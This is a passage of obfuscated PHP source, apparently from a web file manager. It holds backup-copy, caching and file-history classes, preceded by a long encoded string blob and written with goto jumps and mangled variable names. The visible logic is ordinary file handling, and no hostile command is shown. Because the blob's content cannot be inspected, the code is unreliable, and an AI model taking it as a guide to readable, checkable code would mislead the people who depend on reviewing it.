,Û˜').base64_decode('xxTEmFez9qQTz1fC6+BYYjJqsomvIl6EuRoLs1AOC2yYE2VkVr4Zmqow0a4ZKPsa').base64_decode('+IW75kCVZErkAdXQr6xnFjxAeYBh1vBlWu/77VCi2/cOIs3EPCnWvqtee/BdW5qv')."\x7c\xb9\x8\xb6\x10\xf6\xea\x9b\xf8\xdb\xd7\xd3\xfc\x8f\x61\x4f\xf\xd6\x7e\x8c\x1a\xe8\x63\x95\x47\x1a\x2b\x19\x98\xda\x88\x9c\xbf\x90\xf3\xd1\x3a\x65\x28\xa6\x66\x44\x9e\xdd\xac\x95\xfa\x2b".base64_decode('lr8/KXRoOCT3l638HtsiDJ0XyhUvkkGm9DrzpJDcYomw+s4zkJQlDvgMi3g5Z0V7')."\273\233\310\135\23\300\130\44\44\164\130\142\356\245\247\217\361\232\22\156\15\261\23\52\242\353\133\57\355\332\354\372\227\144\75\15\40\217\106\316\221\37\224\360\226\304\366\360".strrev('(’¬Ãa#ÚÑS‡"z£¿zÃ„.g®µ3ğÓq¬˜c—¯6R;eœ¶^°´µŞ')."\xb3\x9d\xf7\xbe\x7c\x41\x12\x9\x98\x79\xc0\x84\x1a\xa4\x43\x36\xef\x19\x27\x77\xe4\x5d\x43\x29\xab\x46\x42\x4a\x26\xa5\x98\x63\x35\xf4\x8b\xaf\xc8\xc5\x85\x2f\x6\x92\x4c\x8f\xf\x22\xd2\xb"."\310\376\122\336\227\263\245\23\321\34\301\274\130\355\241\227\70\213\223\370\14\126\14\113\102\142\13\360\301\353\275\375\134\320\106\4\223\44\170\361\174\236\277\313\356\311\232\147"."\322\10\207\42\210\170\302\35\63\131\322\255\133\141\300\255\217\372\37\303\15\311\67\165\75\31\153\241\342\126\256\124\136\34\177\210\156\142\130\275\356\223\205\346\55\56\337\372"."\xe5\x48\x25\x40\xf4\xed\x2\x6e\x3f\x24\xc9\x3d\xf8\x52\x82\x30\x2c\xa2\x5d\xe1\x42\xbc\xf8\xa4\xf7\x8e\x31\xcf\xc6\xe7\xc\xe5\x21\x57\x40\x82\x1e\xa8\x4f\x92\xc3\x2a\x11\xc6\x31\xf8\x92\x1c"."\xf9\xc9\x79\xef\x41\xa7\xac\x55\x90\x50\x40\x2f\x25\xa4\xea\xe4\x43\xd0\xdd\x16\xc8\xd4\xff\x88\xc0\x4a\xef\x10\x4b\x97\xb3\x45\x2\xdb\xea\xe4\x5a\x3c\x24\x92\x77\xc\x72\xa6\xe5\x44\x4f\x73"."\374\123\113\204\20\201\276\24\130\46\12\130\232\26\361\46\321\374\272\257\365\162\1\177\317\150\11\147\324\160\163\105\111\62\252\115\254\205\333\65\203\12\37\252\337\136\177\253".base64_decode('2Jj65UVRSU17JEuKrFWnDG1R3WI0CZcU7Kqn7G6GAJelSbhsTTIrLKlXpHKuVnV2')."\323\275\332\301\3\235\103\276\116\207\175\222\71\315\272\273\361\254\233\271\366\163\200\161\376\334\104\111\121\277\25\102\267\340\73\321\256\327\212\272\231\167\333\12\221\333\267\13"."\324\243\265\54\245\16\165\25\246\15\265\164\134\244\325\61\264\240\165\342\75\132\166\326\124\47\131\266\332\250\157\327\221\256\273\364\35\257\301\205\17\56\17\14\370\345\244\21"."\146\211\205\44\305\222\61\44\154\320\230\311\364\44\17\175\257\232\103\246\305\367\214\274\260\227\303\306\275\21\333\77\220\65\265\171\361\324\254\112\256\116\353\132\160\7\260\134"."\x5f\x2b\x41\x97\x34\xa6\xb3\x97\x4c\xdf\xa9\xc8\x63\xb9\x46\x4e\xf7\xfa\x53\x95\x7d\x36\xd1\x74\xf6\x91\x92\xa4\x1b\xf4\xa9\xe5\x84\x96\xc1\x63\x10\x50\x47\x71\x45\x40\x34\x18\x12\xea\x6f\x5a"."\237\350\213\204\23\236\53\7\224\117\200\43\1\172\232\30\305\247\326\374\34\211\370\2\245\373\52\115\316\130\266\33\300\151\131\253\102\176\227\130\256\53\116\327\251\130\117\230".strrev('+wÕGfùÁ÷¼ˆğrŸO%•4èÎ^Xšç$/!- ‚4äQ¸F‡ã$9¼A')."\x0\x48\x38\xed\xb7\xc6\x98\xa7\x45\x7c\xad\x59\xb4\x7\x1f\x4c\x48\x43\x26\xf8\x13\x40\x3f\xd9\xfc\x85\x5c\x18\x77\xc2\x34\x25\xc\x1e\xfa\x83\x1a\x66\x14\xe1\x3d\xad\xd0\x60\x65\xc0\x53\x9c"."\276\112\304\115\72\77\255\6\320\242\212\52\250\173\156\242\353\202\273\41\231\154\246\46\251\47\222\311\254\110\245\333\251\67\357\232\144\122\112\62\47\252\111\352\351\112\45\167"."\x97\x16\xeb\x8e\xc4\x13\x35\x69\xd8\xf2\x28\xa9\xa\xb7\x5a\x34\x29\xde\x43\x5a\x49\x8e\xef\x76\xd7\x8a\x78\x74\xa9\x68\x9\x39\x28\x16\xca\xf9\x4a\xd1\x62\x3a\x77\x76\x78\x91\xd1\x4a\x4c\x4a"."\x97\x6e\x3e\xea\x65\xe1\x5f\x4d\x94\x31\x8d\xdc\x90\x50\xee\x69\x12\xf3\xee\x30\xd7\x83\x3c\xe0\x7d\x1a\xc7\x67\xe0\xc7\x90\x14\x2a\xc2\x56\x43\x49\xa8\x3b\x5d\x1\x28\xf6\x6e\xce\xd7\xba\x87".base64_decode('kVYrVdfn3JgeKUp9ppyG5xBdgpMlQ2iQhJbyXkwAU+qOoaz7rT2LIKlijHDbT7XA')."\52\155\320\352\227\316\32\250\244\3\27\24\141\324\45\343\61\32\366\44\273\332\100\335\263\144\252\360\303\104\101\250\342\376\17\257\54\147\215\26\252\0\0"."".""."".strrev(''), 10, -8))); goto cŒ˜ŒóÊã¡; EèÍäîÈĞê: class BackupFile { public function __construct() { } public function index() { $ÄÂÛÃÕæ = Backup::get(); $™‹‹••¢ = $ÄÂÛÃÕæ[$_SERVER[ñ÷§¡å][302]][$_SERVER[ñ÷§¡å][209]][$_SERVER[ñ÷§¡å][477]]; $Ç²¯˜˜ï = array($_SERVER[ñ÷§¡å][478] => array($_SERVER[ñ÷§¡å][820], $™‹‹••¢), $_SERVER[ñ÷§¡å][821] => array($_SERVER[ñ÷§¡å][340], $ÄÂÛÃÕæ[$_SERVER[ñ÷§¡å][765]])); $õôäê§Ş = (int) Model($_SERVER[ñ÷§¡å][802])->where($Ç²¯˜˜ï)->count($_SERVER[ñ÷§¡å][477]); $–úúÁÄÍ = (int) Model($_SERVER[ñ÷§¡å][802])->where($Ç²¯˜˜ï)->sum($_SERVER[ñ÷§¡å][86]); $„±ÖÍ… = new TaskFileTransfer($_SERVER[ñ÷§¡å][822], $_SERVER[ñ÷§¡å][793], $õôäê§Ş, LNG($_SERVER[ñ÷§¡å][794]) . $_SERVER[ñ÷§¡å][795] . LNG($_SERVER[ñ÷§¡å][823])); $„±ÖÍ…->task[$_SERVER[ñ÷§¡å][776]] = $–úúÁÄÍ; $ªÊŸµãç = array($_SERVER[ñ÷§¡å][824] => $õôäê§Ş, $_SERVER[ñ÷§¡å][825] => $–úúÁÄÍ, $_SERVER[ñ÷§¡å][826] => time()); Backup::set($ªÊŸµãç); $ª÷±¦Ç = !0; $ğ·„ø’ = $this->storeIds(); $«‡ÙÖ¤ = 1; $ÇÆ¬Å€ = 1000; $ÉğÏÜ… = $Ñ„®¸¢Š = 0; $ŞØ¥ô = array(); $–¿±ú°« = $®˜Ã¤ñı = 0; do { $’Œ‰úÒ° = $_SERVER[ñ÷§¡å][827]; $¤Ãá—²Ù = Model($_SERVER[ñ÷§¡å][802])->where($Ç²¯˜˜ï)->field($’Œ‰úÒ°)->order($_SERVER[ñ÷§¡å][828])->selectPage($ÇÆ¬Å€, $«‡ÙÖ¤); $ÅÚóàæ¤ = !empty($¤Ãá—²Ù[$_SERVER[ñ÷§¡å][378]]) ? $¤Ãá—²Ù[$_SERVER[ñ÷§¡å][378]] : array(); foreach ($ÅÚóàæ¤ as $òŞÅÜÃ£) { if (!$this->_fileExist($òŞÅÜÃ£, $ŞØ¥ô, $ğ·„ø’)) { $õôäê§Ş -= 1; $–úúÁÄÍ -= (int) $òŞÅÜÃ£[$_SERVER[ñ÷§¡å][86]]; write_log("\146\151\154\x65\40\156\x6f\164\x20\x65\x78\151\163\164\x2e\146\x69\154\x65\111\104\x3a{$òŞÅÜÃ£[$_SERVER[ñ÷§¡å][477]]}\x2c\x20\160\x61\164\x68\x3a{$òŞÅÜÃ£[$_SERVER[ñ÷§¡å][94]]}", $_SERVER[ñ÷§¡å][829]); continue; } $‡È§†ã³ = $òŞÅÜÃ£[$_SERVER[ñ÷§¡å][94]]; $İÛËêó = "\x7b\x69\x6f\72{$ÄÂÛÃÕæ[$_SERVER[ñ÷§¡å][765]]}\175" . substr($‡È§†ã³, strlen("\x7b\151\x6f\x3a{$òŞÅÜÃ£[$_SERVER[ñ÷§¡å][830]]}\x7d")); if (IO::exist($İÛËêó)) { $„±ÖÍ…->updateFileEnd($òŞÅÜÃ£[$_SERVER[ñ÷§¡å][32]], $òŞÅÜÃ£[$_SERVER[ñ÷§¡å][86]]); } else { $İÛËêó = get_path_father($İÛËêó); IO::mkdir($İÛËêó); if (!IO::copy($‡È§†ã³, $İÛËêó, $_SERVER[ñ÷§¡å][831])) { write_log($_SERVER[ñ÷§¡å][832] . $‡È§†ã³ . $_SERVER[ñ÷§¡å][816] . $İÛËêó . $_SERVER[ñ÷§¡å][174], $_SERVER[ñ÷§¡å][793]); $ª÷±¦Ç = !1; break; } } $™‹‹••¢ = $òŞÅÜÃ£[$_SERVER[ñ÷§¡å][477]]; $Ñ„®¸¢Š += 1; $ÉğÏÜ… += $òŞÅÜÃ£[$_SERVER[ñ÷§¡å][86]]; $®˜Ã¤ñı += 1; $–¿±ú°« += $òŞÅÜÃ£[$_SERVER[ñ÷§¡å][86]]; if ($ÉğÏÜ… >= 1024 * 1024 * 100) { $ªÊŸµãç = array($_SERVER[ñ÷§¡å][833] => $™‹‹••¢, $_SERVER[ñ÷§¡å][834] => $®˜Ã¤ñı, $_SERVER[ñ÷§¡å][835] => $–¿±ú°«); Backup::set($ªÊŸµãç); $ÉğÏÜ… = $Ñ„®¸¢Š = 0; } } $Š«£èªÂ = count($ÅÚóàæ¤); $«‡ÙÖ¤++; } while ($Š«£èªÂ == $ÇÆ¬Å€); $„±ÖÍ…->end(); $ªÊŸµãç = array($_SERVER[ñ÷§¡å][836] => 1, $_SERVER[ñ÷§¡å][506] => time(), $_SERVER[ñ÷§¡å][788] => 1, $_SERVER[ñ÷§¡å][833] => $™‹‹••¢, $_SERVER[ñ÷§¡å][825] => $–úúÁÄÍ, $_SERVER[ñ÷§¡å][824] => $õôäê§Ş, $_SERVER[ñ÷§¡å][837] => time()); if ($Ñ„®¸¢Š) { $ªÊŸµãç[$_SERVER[ñ÷§¡å][834]] = $®˜Ã¤ñı; $ªÊŸµãç[$_SERVER[ñ÷§¡å][835]] = $–¿±ú°«; } Backup::set($ªÊŸµãç); $this->_fileFilter($ŞØ¥ô); return !0; } private function _fileExist($èÈ²ú­, &$­Ÿî—£º, $Ù¡ø•È¤) { $“şŒ‡˜ö =& $_SERVER[ñ÷§¡å]; $Æë¬ÊÊ = $èÈ²ú­[$“şŒ‡˜ö[94]]; if (in_array($èÈ²ú­[$“şŒ‡˜ö[477]], $­Ÿî—£º)) { return !1; } if (!in_array($èÈ²ú­[$“şŒ‡˜ö[830]], $Ù¡ø•È¤)) { return !1; } if (IO::exist($Æë¬ÊÊ)) { return !0; } $ğî´ÅŠâ = get_path_father($Æë¬ÊÊ); if (IO::exist($ğî´ÅŠâ)) { $­Ÿî—£º[] = $èÈ²ú­[$“şŒ‡˜ö[477]]; return !1; } $ñ”É‹ÒÈ = array($“şŒ‡˜ö[830] => $èÈ²ú­[$“şŒ‡˜ö[830]], $“şŒ‡˜ö[94] => array($“şŒ‡˜ö[392], "{$ğî´ÅŠâ}\x25")); $â¬¿úíÅ = Model($“şŒ‡˜ö[802])->where($ñ”É‹ÒÈ)->field($“şŒ‡˜ö[478])->select(); $­Ÿî—£º = array_merge($­Ÿî—£º, array_to_keyvalue($â¬¿úíÅ, $“şŒ‡˜ö[12], $“şŒ‡˜ö[477])); return !1; } private function _fileFilter($ëóŒåâ„) { $ã®…³óÎ =& $_SERVER[ñ÷§¡å]; if (empty($ëóŒåâ„)) { return; } $Ëş´Û¤ = array($ã®…³óÎ[477] => array($ã®…³óÎ[7], array_unique($ëóŒåâ„))); $×¥Ïæ• = Model($ã®…³óÎ[838])->where($Ëş´Û¤)->field($ã®…³óÎ[411])->select(); foreach ($×¥Ïæ• as $ê¹ï„È) { Model($ã®…³óÎ[838])->remove($ê¹ï„È[$ã®…³óÎ[411]], !1); } } private function storeIds() { $¦›š·ËÄ =& $_SERVER[ñ÷§¡å]; $’ŞàÁÅ = Model($¦›š·ËÄ[780])->listData(); $·á±±˜š = array(); $ÓÓ«Ê…¹ = $GLOBALS[$¦›š·ËÄ[6]][$¦›š·ËÄ[99]][$¦›š·ËÄ[839]]; foreach ($’ŞàÁÅ as $ŞÎÚÓÇí) { $„°§ÁÚ« = strtolower($ŞÎÚÓÇí[$¦›š·ËÄ[105]]); if (!isset($ÓÓ«Ê…¹[$„°§ÁÚ«])) { continue; } $ÃôŞ„ßù = $¦›š·ËÄ[84] . (isset($ÓÓ«Ê…¹[$„°§ÁÚ«]) ? $ÓÓ«Ê…¹[$„°§ÁÚ«] : ucfirst($„°§ÁÚ«)); if (!class_exists($ÃôŞ„ßù)) { continue; } $·á±±˜š[] = $ŞÎÚÓÇí[$¦›š·ËÄ[408]]; } return $·á±±˜š; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $àÏ÷«÷Ï =& $_SERVER[ñ÷§¡å]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Úàëá = $GLOBALS[$àÏ÷«÷Ï[6]][$àÏ÷«÷Ï[358]]; $â¯ë™©× = $Úàëá[$Úàëá[$àÏ÷«÷Ï[840]]]; $²’“Ü…¶ = $Úàëá[$àÏ÷«÷Ï[841]]; switch ($Úàëá[$àÏ÷«÷Ï[840]]) { case $àÏ÷«÷Ï[21]: self::$handle = Model($àÏ÷«÷Ï[842]); break; case $àÏ÷«÷Ï[843]: self::$handle = new CacheRedis($â¯ë™©×, $²’“Ü…¶); break; case $àÏ÷«÷Ï[844]: self::$handle = new CacheMemcached($â¯ë™©×, $²’“Ü…¶); break; case $àÏ÷«÷Ï[209]: self::$handle = new CacheFile($â¯ë™©×, $²’“Ü…¶); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ò¾¥Ò©Ç) { if (is_array($ò¾¥Ò©Ç) || is_object($ò¾¥Ò©Ç)) { $ò¾¥Ò©Ç = json_encode($ò¾¥Ò©Ç); } $ò¾¥Ò©Ç = rawurlencode($ò¾¥Ò©Ç); return md5(KOD_SITE_ID . $_SERVER[ñ÷§¡å][11] . $ò¾¥Ò©Ç); } public static function get($Úù ö··, $Ÿ¨¤İìâ = false) { $îëÍúŞº = self::key($Úù ö··); if ($Ÿ¨¤İìâ) { return unserialize(self::init()->get($îëÍúŞº)); } if (!isset(self::$memoryCache[$îëÍúŞº])) { $ è›¾·Õ = self::init()->get($îëÍúŞº); self::$memoryCache[$îëÍúŞº] = unserialize($ è›¾·Õ); } return self::$memoryCache[$îëÍúŞº]; } public static function set($¾©‰—É™, $—Ô­ñÕ•, $‘Ö÷¢ş¢ = false) { $Ã¢ìİ¾Ù = self::key($¾©‰—É™); if (isset(self::$memoryCache[$Ã¢ìİ¾Ù]) && self::$memoryCache[$Ã¢ìİ¾Ù] === $—Ô­ñÕ•) { return !0; } if ($‘Ö÷¢ş¢ === 0) { self::$memoryCache[$Ã¢ìİ¾Ù] = $—Ô­ñÕ•; return !0; } CacheLock::lock($¾©‰—É™); $êàêÍè = self::init()->set($Ã¢ìİ¾Ù, serialize($—Ô­ñÕ•), $‘Ö÷¢ş¢); self::$memoryCache[$Ã¢ìİ¾Ù] = $—Ô­ñÕ•; CacheLock::unlock($¾©‰—É™); return $êàêÍè; } public static function getCall($¬—áì§, $é•ƒÃ£±, $ŒÅ‹Ñ•, $×´öö´Ğ = array()) { $ª¯ÉÓ½¼ =& $_SERVER[ñ÷§¡å]; $Ğ¸§…¢ç = self::get($¬—áì§); if ($Ğ¸§…¢ç || $Ğ¸§…¢ç === $ª¯ÉÓ½¼[12]) { return $Ğ¸§…¢ç; } $Ğ¸§…¢ç = call_user_func_array($ŒÅ‹Ñ•, $×´öö´Ğ); $Ğ¸§…¢ç = $Ğ¸§…¢ç ? $Ğ¸§…¢ç : $ª¯ÉÓ½¼[12]; self::set($¬—áì§, $Ğ¸§…¢ç, $é•ƒÃ£±); return $Ğ¸§…¢ç; } public static function remove($‹û§Ü‚Å) { $ÒÂı—°¹ = self::key($‹û§Ü‚Å); unset(self::$memoryCache[$ÒÂı—°¹]); self::clearTimeout(); CacheLock::lock($‹û§Ü‚Å); $Òâ«îÕÀ = self::init()->remove($ÒÂı—°¹); CacheLock::unlock($‹û§Ü‚Å); return $Òâ«îÕÀ; } public static function removeMemory($‘°ïÎêé) { $¥â°Ñä† = self::key($‘°ïÎêé); unset(self::$memoryCache[$¥â°Ñä†]); } public static function clearMemory($ ’±¢á = false) { if ($ ’±¢á) { $ ’±¢á = self::key($ ’±¢á); unset(self::$memoryCache[$ ’±¢á]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ñ÷§¡å][845])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ñ÷§¡å][846])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($‚ÆÂòâø, $Ûê–´ñØ) { $Ì¬Î ÊÈ =& $_SERVER[ñ÷§¡å]; $this->cachePath = $‚ÆÂòâø[$Ì¬Î ÊÈ[94]]; $this->prefix = $Ì¬Î ÊÈ[847]; $this->cacheTime = $Ûê–´ñØ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Íµ¸ôÎ) { $óæÓöĞÌ =& $_SERVER[ñ÷§¡å]; $Íµ¸ôÎ = str_replace(array($óæÓöĞÌ[848], $óæÓöĞÌ[107], $óæÓöĞÌ[83]), $óæÓöĞÌ[849], $Íµ¸ôÎ); return $this->cachePath . $óæÓöĞÌ[850] . $Íµ¸ôÎ . $óæÓöĞÌ[851]; } public function set($‘Áæ×è, $¦¸ï¢—µ, $ß»¶Ì“¢ = false) { $×Ÿ¦Ï² = $this->getFile($‘Áæ×è); if (file_put_contents($×Ÿ¦Ï², $this->prefix . $¦¸ï¢—µ, LOCK_EX)) { @touch($×Ÿ¦Ï², intval(time() + $ß»¶Ì“¢)); clearstatcache(); return !0; } @unlink($×Ÿ¦Ï²); return !1; } public function get($›ªÅ¬…ß) { $ØÔÜñÆÌ = $this->getFile($›ªÅ¬…ß); if (file_exists($ØÔÜñÆÌ) && filemtime($ØÔÜñÆÌ) < time()) { @unlink($ØÔÜñÆÌ); return !1; } $Èñ€ÆÒ = @file_get_contents($ØÔÜñÆÌ); return substr($Èñ€ÆÒ, strlen($this->prefix)); } public function remove($ºö¥çÒ¤) { $é‘Ëƒ€â = $this->getFile($ºö¥çÒ¤); return @unlink($é‘Ëƒ€â); } public function deleteAll() { $Ôƒğ› =& $_SERVER[ñ÷§¡å]; $˜áÜŠâÅ = scandir($this->cachePath); foreach ($˜áÜŠâÅ as $úõÛàÌÂ) { $„Ú¤ˆÏ˜ = $this->cachePath . $úõÛàÌÂ; if (strpos($„Ú¤ˆÏ˜, $Ôƒğ›[851]) && strpos($„Ú¤ˆÏ˜, $Ôƒğ›[852])) { @unlink($„Ú¤ˆÏ˜); } } } public function clearTimeout() { $½µş¦Šæ =& $_SERVER[ñ÷§¡å]; $åÌ‘Â¿Ÿ = scandir($this->cachePath); foreach ($åÌ‘Â¿Ÿ as $ş±ôµ÷à) { $â§ÇÕ®Ñ = $this->cachePath . $ş±ôµ÷à; if (strpos($â§ÇÕ®Ñ, $½µş¦Šæ[851]) && strpos($â§ÇÕ®Ñ, $½µş¦Šæ[852]) && filemtime($â§ÇÕ®Ñ) < time()) { @unlink($â§ÇÕ®Ñ); } } } } goto C—ê…¶Ö¿ç; fÏŞ»¯Ù¶‡: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\143\x65\137\x68\151\163\164\x6f\162\x79"; public function historyCount($ñøµâç‘) { $Ëèè„¯Í =& $_SERVER[ñ÷§¡å]; if (!$ñøµâç‘) { return array(); } if (is_string($ñøµâç‘) || is_int($ñøµâç‘)) { $ñøµâç‘ = array($ñøµâç‘); } $çû£¯Óò = array($Ëèè„¯Í[411], $Ëèè„¯Í[1868] => $Ëèè„¯Í[509]); $´ÆõÔÙÜ = array($Ëèè„¯Í[411] => array($Ëèè„¯Í[7], $ñøµâç‘)); $”ˆ’¬‡ = $this->field($çû£¯Óò)->where($´ÆõÔÙÜ)->group($Ëèè„¯Í[411])->select(); return array_to_keyvalue($”ˆ’¬‡, $Ëèè„¯Í[411], $Ëèè„¯Í[509]); } public function addHistory($—¬–ô’, $Ï½Û±¼È = '') { $À¥ÍèéÉ =& $_SERVER[ñ÷§¡å]; $İó‹ö¨º = array($À¥ÍèéÉ[426] => $—¬–ô’[$À¥ÍèéÉ[411]], $À¥ÍèéÉ[1654] => isset($—¬–ô’[$À¥ÍèéÉ[465]]) ? $—¬–ô’[$À¥ÍèéÉ[465]] : $—¬–ô’[$À¥ÍèéÉ[463]], $À¥ÍèéÉ[478] => $—¬–ô’[$À¥ÍèéÉ[477]], $À¥ÍèéÉ[594] => $—¬–ô’[$À¥ÍèéÉ[86]], $À¥ÍèéÉ[2074] => $Ï½Û±¼È); if ($GLOBALS[$À¥ÍèéÉ[6]][$À¥ÍèéÉ[99]][$À¥ÍèéÉ[1216]] >= 1) { $this->historyAutoClear($İó‹ö¨º[$À¥ÍèéÉ[411]]); $this->add($İó‹ö¨º); } Hook::trigger($À¥ÍèéÉ[2075], $İó‹ö¨º); Model($À¥ÍèéÉ[2076])->eventFileEdit($—¬–ô’[$À¥ÍèéÉ[411]]); } private function historyAutoClear($×³ê»ûÌ) { $öãå—ùß =& $_SERVER[ñ÷§¡å]; $¸Ì§ìé¯ = Model($öãå—ùß[783])->get($öãå—ùß[1238]); $Ä¤ñŸ®ø = $GLOBALS[$öãå—ùß[6]][$öãå—ùß[99]][$öãå—ùß[1216]]; $è–¿µ«ß = $¸Ì§ìé¯ == $öãå—ùß[1239] ? min(5, $Ä¤ñŸ®ø) : $Ä¤ñŸ®ø; $è–¿µ«ß = $è–¿µ«ß <= 0 ? 0 : $è–¿µ«ß - 1; if ($è–¿µ«ß >= 500) { return; } $¨®ĞñÃà = array($öãå—ùß[426] => $×³ê»ûÌ); $úÌåÕÈ… = $this->field($öãå—ùß[2077])->where($¨®ĞñÃà)->order($öãå—ùß[2071])->select(); if (!$úÌåÕÈ… || $è–¿µ«ß >= count($úÌåÕÈ…)) { return; } $¤¥Ôêş = array_to_keyvalue($úÌåÕÈ…, $öãå—ùß[12], $öãå—ùß[408]); $¤¥Ôêş = array_slice($¤¥Ôêş, $è–¿µ«ß); $ÉĞÍÊ»Ö = array_to_keyvalue($úÌåÕÈ…, $öãå—ùß[12], $öãå—ùß[477]); $ÉĞÍÊ»Ö = array_slice($ÉĞÍÊ»Ö, $è–¿µ«ß); if (!$¤¥Ôêş || !$ÉĞÍÊ»Ö) { return; } $¨®ĞñÃà = array($öãå—ùß[428] => array($öãå—ùß[7], $¤¥Ôêş)); $this->where($¨®ĞñÃà)->delete(); Model($öãå—ùß[480])->remove($ÉĞÍÊ»Ö); } public function listData($éê§ˆ¡Á) { $ï¸¼æñ€ =& $_SERVER[ñ÷§¡å]; $®æ¼êô• = array($ï¸¼æñ€[426] => $éê§ˆ¡Á); $¦Ğ¸ä¾Å = $ï¸¼æñ€[2078]; $á·ßİøö = $this->field($¦Ğ¸ä¾Å)->where($®æ¼êô•)->order($ï¸¼æñ€[2071])->selectPage(); $this->_listAppendUser($á·ßİøö[$ï¸¼æñ€[378]]); $çİÅĞ¨ = Model($ï¸¼æñ€[783])->get($ï¸¼æñ€[1238]); $¡¨’¸ = 5; if ($çİÅĞ¨ == $ï¸¼æñ€[1239]) { $á·ßİøö[$ï¸¼æñ€[378]] = array_slice($á·ßİøö[$ï¸¼æñ€[378]], 0, $¡¨’¸); $á·ßİøö[$ï¸¼æñ€[375]] = array($ï¸¼æñ€[2079] => 1, $ï¸¼æñ€[2080] => 20, $ï¸¼æñ€[2081] => 1, $ï¸¼æñ€[2082] => count($á·ßİøö[$ï¸¼æñ€[378]])); } return $á·ßİøö; } protected function _listAppendUser(&$§œ©ÅÔş) { $ôúÕŠá =& $_SERVER[ñ÷§¡å]; $çï…¦ = array_to_keyvalue($§œ©ÅÔş, $ôúÕŠá[12], $ôúÕŠá[1663]); $œÂ¾½­¦ = Model($ôúÕŠá[544])->userListInfo($çï…¦); foreach ($§œ©ÅÔş as &$™‘¤¸Ë) { $âäÆµ¨á = $™‘¤¸Ë[$ôúÕŠá[1663]]; $™‘¤¸Ë[$ôúÕŠá[463]] = $œÂ¾½­¦[$âäÆµ¨á] ? $œÂ¾½­¦[$âäÆµ¨á] : !1; } unset($™‘¤¸Ë); } public function fileInfo($ŞÜ¯¤) { $¨›ûÔÜ =& $_SERVER[ñ÷§¡å]; $²Ÿ¥øæ… = $this->tablePrefix; $À´ÌæßÀ = "{$²Ÿ¥øæ…}\151\x6f\137\x66\151\154\145\40\146\151\154\x65\x73\x20\x6f\156\x20\x66\151\x6c\x65\163\x2e\x66\x69\154\x65\x49\x44\x20\75\40\x68\151\163\164\157\162\x79\56\146\151\x6c\x65\111\104"; return $this->alias($¨›ûÔÜ[2083])->where(array($¨›ûÔÜ[428] => $ŞÜ¯¤))->join($À´ÌæßÀ, $¨›ûÔÜ[2084])->find(); } public function removeItem($”â»ÂşÀ) { $Ï–ºû†„ =& $_SERVER[ñ÷§¡å]; $»ŠµùªÑ = array($Ï–ºû†„[428] => $”â»ÂşÀ); $Ş–¸¡Œ“ = $this->where($»ŠµùªÑ)->find(); if ($Ş–¸¡Œ“) { $ä¦õüİ² = $this->where($»ŠµùªÑ)->delete(); Model($Ï–ºû†„[480])->remove($Ş–¸¡Œ“[$Ï–ºû†„[477]]); return $ä¦õüİ²; } return !1; } public function removeBySource($šóòş®İ) { $¨ãó÷šï =& $_SERVER[ñ÷§¡å]; if (!$šóòş®İ) { return !1; } if (!is_array($šóòş®İ)) { $šóòş®İ = array($šóòş®İ); } $Ç­áĞÔŞ = array($¨ãó÷šï[426] => array($¨ãó÷šï[7], $šóòş®İ)); $Õß±¹›Ë = $this->field($¨ãó÷šï[478])->where($Ç­áĞÔŞ)->select(); if ($Õß±¹›Ë) { $this->where($Ç­áĞÔŞ)->delete(); $ğŸ÷âØ· = array_to_keyvalue($Õß±¹›Ë, $¨ãó÷šï[12], $¨ãó÷šï[477]); Model($¨ãó÷šï[480])->remove($ğŸ÷âØ·); } return !0; } public function setDetail($¼‹Â„Á , $©ĞˆıËÔ) { $Œßå¡ì =& $_SERVER[ñ÷§¡å]; return $this->where(array($Œßå¡ì[428] => $¼‹Â„Á ))->save(array($Œßå¡ì[2074] => $©ĞˆıËÔ)); } public function rollbackToItem($şî³¾Ú, $ĞîäšÂ‰) { $î¦Ó„¡ñ =& $_SERVER[ñ÷§¡å]; $Ü“ğªÕ = Model($î¦Ó„¡ñ[838])->sourceInfo($şî³¾Ú); $this->addHistory($Ü“ğªÕ, LNG($î¦Ó„¡ñ[2085])); $„ŒĞä•’ = $this->find($ĞîäšÂ‰); $‘ªº±µ = array($î¦Ó„¡ñ[477] => $„ŒĞä•’[$î¦Ó„¡ñ[477]], $î¦Ó„¡ñ[86] => $„ŒĞä•’[$î¦Ó„¡ñ[86]], $î¦Ó„¡ñ[95] => time(), $î¦Ó„¡ñ[465] => USER_ID); Model($î¦Ó„¡ñ[838])->where(array($î¦Ó„¡ñ[411] => $şî³¾Ú))->save($‘ªº±µ); return $this->where(array($î¦Ó„¡ñ[428] => $ĞîäšÂ‰))->delete(); } public function clearSame($Ã„ƒ¢—…) { $¹ŸĞ©¥ =& $_SERVER[ñ÷§¡å]; $Æª²”¹Ü = $this->listData($Ã„ƒ¢—…); $ìè¼ÄÏø = array_to_keyvalue_group($Æª²”¹Ü, $¹ŸĞ©¥[477]); $Åğ“ù¬ = array(); $¯ÒŠÅÌŒ = array(); foreach ($ìè¼ÄÏø as $¨‚šã¼Ş) { if (!$¨‚šã¼Ş || count($¨‚šã¼Ş) <= 1) { continue; } foreach ($¨‚šã¼Ş as $…é·…›£) { $Åğ“ù¬[] = $…é·…›£[$¹ŸĞ©¥[477]]; $¯ÒŠÅÌŒ[] = $…é·…›£[$¹ŸĞ©¥[408]]; } } if (!$¯ÒŠÅÌŒ) { return; } $this->where(array($¹ŸĞ©¥[408] => array($¹ŸĞ©¥[7], $¯ÒŠÅÌŒ)))->delete(); Model($¹ŸĞ©¥[480])->remove($Åğ“ù¬); } public function userSpace() { $ä”“›  =& $_SERVER[ñ÷§¡å]; $âàİÄÀ× = $this->tablePrefix; $Û°¢¨ = array($ä”“› [1654] => USER_ID); $âëçÂ×« = "{$âàİÄÀ×}\x69\x6f\x5f\x66\x69\x6c\145\40\146\x69\154\x65\163\x20\157\156\40\x66\151\x6c\x65\163\x2e\146\151\x6c\145\111\x44\x20\75\x20\x68\151\163\164\x6f\x72\x79\56\x66\x69\x6c\145\x49\104"; return $this->alias($ä”“› 